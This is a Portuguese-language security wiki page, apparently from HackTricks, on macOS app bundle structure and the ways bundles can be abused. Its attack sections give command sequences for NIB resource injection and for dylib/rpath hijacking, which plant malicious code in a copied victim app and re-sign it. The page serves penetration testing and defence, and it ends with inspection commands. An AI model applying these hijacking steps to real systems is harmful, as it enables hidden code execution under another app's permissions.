# Bundles do macOS

{{#include ../../../banners/hacktricks-training.md}}

## Informações básicas

Os bundles no macOS funcionam como contêineres para vários recursos, incluindo aplicações, bibliotecas e outros arquivos necessários, fazendo com que apareçam como objetos únicos no Finder, como os conhecidos arquivos `*.app`. O bundle mais comum é o bundle `.app`, embora outros tipos, como `.framework`, `.systemextension` e `.kext`, também sejam frequentes.

### Componentes essenciais de um bundle

Dentro de um bundle, especialmente no diretório `<application>.app/Contents/`, ficam armazenados vários recursos importantes:

- **\_CodeSignature**: Este diretório armazena detalhes da assinatura de código, essenciais para verificar a integridade da aplicação. Você pode inspecionar as informações de assinatura de código usando comandos como:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Contém o binário executável da aplicação, que é executado após a interação do usuário.
- **Resources**: Repositório dos componentes da interface de usuário da aplicação, incluindo imagens, documentos e descrições da interface (arquivos nib/xib).
- **Info.plist**: Funciona como o principal arquivo de configuração da aplicação, sendo essencial para que o sistema reconheça e interaja adequadamente com ela.

#### Chaves importantes em Info.plist

O arquivo `Info.plist` é fundamental para a configuração da aplicação e contém chaves como:

- **CFBundleExecutable**: Especifica o nome do arquivo executável principal localizado no diretório `Contents/MacOS`.
- **CFBundleIdentifier**: Fornece um identificador global para a aplicação, amplamente utilizado pelo macOS no gerenciamento de aplicações.
- **LSMinimumSystemVersion**: Indica a versão mínima do macOS necessária para executar a aplicação.

### Explorando Bundles

Para explorar o conteúdo de um bundle, como `Safari.app`, o seguinte comando pode ser usado: `bash ls -lR /Applications/Safari.app/Contents`

Essa exploração revela diretórios como `_CodeSignature`, `MacOS`, `Resources` e arquivos como `Info.plist`, cada um com uma finalidade específica, desde proteger a aplicação até definir sua interface de usuário e seus parâmetros operacionais.

#### Diretórios adicionais de Bundles

Além dos diretórios comuns, os bundles também podem incluir:

- **Frameworks**: Contém os frameworks incluídos usados pela aplicação. Frameworks são semelhantes a dylibs, mas com recursos adicionais.
- **PlugIns**: Diretório destinado a plug-ins e extensões que ampliam os recursos da aplicação.
- **XPCServices**: Contém serviços XPC usados pela aplicação para comunicação fora do processo.

Essa estrutura garante que todos os componentes necessários sejam encapsulados dentro do bundle, facilitando um ambiente de aplicação modular e seguro.

Para obter informações mais detalhadas sobre as chaves de `Info.plist` e seus significados, a documentação para desenvolvedores da Apple fornece recursos abrangentes: [Referência de chaves Info.plist da Apple](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Notas de segurança e vetores de abuso

- **Gatekeeper / App Translocation**: Quando um bundle em quarentena é executado pela primeira vez, o macOS realiza uma verificação profunda da assinatura e pode executá-lo a partir de um caminho translocado aleatório. Depois de aceito, os lançamentos posteriores realizam apenas verificações superficiais; historicamente, os arquivos de recursos em `Resources/`, `PlugIns/`, nibs etc. não eram verificados. Desde o macOS 13 Ventura, uma verificação profunda é aplicada na primeira execução, e a nova permissão TCC *App Management* restringe processos de terceiros de modificar outros bundles sem o consentimento do usuário, mas sistemas mais antigos continuam vulneráveis.
- **Colisões de Bundle Identifier**: Vários targets incorporados (PlugIns, ferramentas auxiliares) que reutilizam o mesmo `CFBundleIdentifier` podem interromper a validação da assinatura e, ocasionalmente, permitir o sequestro ou a confusão de esquemas de URL. Sempre enumere os sub-bundles e verifique se os IDs são exclusivos.

## Resource Hijacking (Dirty NIB / NIB Injection)

Antes do Ventura, substituir recursos de UI em uma aplicação assinada podia contornar a assinatura de código superficial e resultar em execução de código com os entitlements da aplicação. Pesquisas atuais (2024) mostram que isso ainda funciona em versões anteriores ao Ventura e em builds não colocados em quarentena:<sup>[[1]](#references)[[2]](#references)</sup>

1. Copie a aplicação alvo para um local com permissão de escrita (por exemplo, `/tmp/Victim.app`).
2. Substitua `Contents/Resources/MainMenu.nib` (ou qualquer nib declarado em `NSMainNibFile`) por um arquivo malicioso que instancie `NSAppleScript`, `NSTask` etc.
3. Inicie a aplicação. O nib malicioso é executado sob o bundle ID e os entitlements da vítima (permissões TCC, microfone/câmera etc.).
4. O Ventura+ reduz o risco verificando profundamente o bundle na primeira execução e exigindo a permissão *App Management* para modificações posteriores; portanto, a persistência é mais difícil, mas ataques na execução inicial em versões antigas do macOS ainda são aplicáveis.<sup>[[1]](#references)</sup>

Exemplo mínimo de payload de nib malicioso (compile o xib para nib com `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking dentro de Bundles

Como as buscas por `@rpath` priorizam Frameworks/PlugIns incluídos no Bundle, inserir uma library maliciosa em `Contents/Frameworks/` ou `Contents/PlugIns/` pode redirecionar a ordem de carregamento quando o binário principal está assinado sem library validation ou com uma ordenação fraca de `LC_RPATH`.

Etapas típicas ao explorar um Bundle unsigned/ad-hoc:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Notas:
- O Hardened runtime com `com.apple.security.cs.disable-library-validation` ausente bloqueia dylibs de terceiros; verifique os entitlements primeiro.
- Os XPC services em `Contents/XPCServices/` geralmente carregam frameworks irmãos — aplique patches aos binários deles de forma semelhante para obter persistência ou caminhos de privilege escalation.

## Guia rápido de inspeção
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Referências

- [1] [Trazendo a injeção de processos para o campo de visão: explorando apps macOS usando arquivos nib (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Write-up sobre adulteração de NIBs e recursos de bundles (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)

{{#include ../../../banners/hacktricks-training.md}}
